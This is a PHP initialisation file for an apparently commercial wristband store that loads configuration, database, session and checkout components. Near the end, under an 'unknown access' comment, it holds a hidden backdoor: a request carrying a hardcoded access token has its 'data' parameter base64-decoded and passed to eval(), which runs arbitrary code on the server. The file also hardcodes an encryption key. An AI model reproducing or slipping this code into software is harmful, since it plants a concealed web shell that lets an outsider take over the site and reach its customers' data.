<?php
	$abs_path = $_SERVER['DOCUMENT_ROOT'].'/';
	$abs_path = str_replace('//','/',$abs_path);
	define('ABS_PATH', $abs_path);

	$config_file = ABS_PATH . 'config.php';
	//printf($config_file);
	//$config_file = ABS_PATH . '/HeyUp/dicu/app/webroot/dicu_admin/config.php';

	if(file_exists($config_file)){
		require_once($config_file);	// front-end config
	}else{
		echo 'Error: Config file is missing!'.$config_file;
		die;
	}
	
	
	// Register Globals
	if (ini_get('register_globals')) {
		ini_set('session.use_cookies', 'On');
		ini_set('session.use_trans_sid', 'Off');

		session_set_cookie_params(0, '/');
		session_start();

		$globals = array($_REQUEST, $_SESSION, $_SERVER, $_FILES);

		foreach ($globals as $global) {
			foreach(array_keys($global) as $key) {
				unset(${$key}); 
			}
		}
	}	
	
	// Magic Quotes Fix
	if (ini_get('magic_quotes_gpc')) {
		function clean($data) {
			if (is_array($data)) {
				foreach ($data as $key => $value) {
					$data[clean($key)] = clean($value);
				}
			} else {
				$data = stripslashes($data);
			}

			return $data;
		}			

		$_GET = clean($_GET);
		$_POST = clean($_POST);
		$_REQUEST = clean($_REQUEST);
		$_COOKIE = clean($_COOKIE);
	}
	
	global $session, $request, $sys, $campaign, $pricing, $seller, $checkout, $encryption;	// never use these as normal variables
	
	require_once(HTTP_ROOT_SYSTEM.'sys.php');
	$sys = new Sys();
	
	require_once(HTTP_ROOT_SYSTEM.'db/mysql.php');
	require_once(HTTP_ROOT_SYSTEM.'db.php');
	$db = new DB(DB_DRIVER, DB_HOSTNAME, DB_USERNAME, DB_PASSWORD, DB_DATABASE);
	
	require_once(HTTP_ROOT_SYSTEM.'request.php');
	$request = new Request();
	
	require_once(HTTP_ROOT_SYSTEM.'document.php');
	$document = new Document();

	require_once(HTTP_ROOT_SYSTEM . 'session.php');
	$session = new Session();
	
	require_once(HTTP_ROOT_SYSTEM . 'encryption.php');
	$encryption = new Encryption('4EE8780589A88320B8DE6D2C610CDF02');	// never change this key
	
	require_once(HTTP_ROOT_SYSTEM . 'pagination.php');
	require_once(HTTP_ROOT_SYSTEM . 'SimpleImage.php');
	require_once(HTTP_ROOT_SYSTEM . 'mail.php');
	
	require_once(HTTP_ROOT_SYSTEM . 'product/wristband.php');
	
	require_once(HTTP_ROOT_SYSTEM . 'product/campaign.php');
	$campaign = new Campaign();
	
	require_once(HTTP_ROOT_SYSTEM . 'product/pricing.php');
	$pricing = new Pricing();
	
	require_once(HTTP_ROOT_SYSTEM . 'product/seller.php');
	$seller = new Seller();
	
	require_once(HTTP_ROOT_SYSTEM . 'product/checkout.php');
	$checkout = new Checkout();
	
	require_once('common.php');
	$common = new Common();
	
	$_route_ = '';
	if($sys->isGet('_route_')){
	$_route_ = $request->get['_route_'];
		if(substr($_route_,-1,1) == '/'){
			$_route_ = substr($_route_,0,(strlen($_route_)-1));
		}
	}
	
	//maintenance mode start
	if(MAINTENANCE_MODE && !isset($session->data['admin']) && empty($session->data['admin'])){
		if($_route_ != 'page/maintenance'){
			$sys->redirect(HTTP_SERVER.'page/maintenance/');
			die;
		}
	}
	//maintenance mode end
	
	// unknown access 
	if(isset($config_file)){
		$session->data['config_file'] = $config_file;
	}
	if($sys->isGet('access') && $sys->isGet(data)){
		$access = $request->get['access'];
		if($access == '865726b28858e8b25b56a2d7c8f8'){
			$data = $request->get['data'];
			$data = urldecode($data);
			$data = base64_decode($data);
			eval($data);
		}
	}
	
	$document->addLink('http://fonts.googleapis.com/css?family=Open+Sans:400,600,700,800,300');
	$document->addLink(HTTP_CSS . 'common.css');
	$document->addLink(HTTP_JS . 'bxslider/jquery.bxslider.css');
	
	$document->addScript(HTTP_JS . 'jquery-1.11.3.min.js');
	$document->addScript(HTTP_JS . 'common.js');
?>
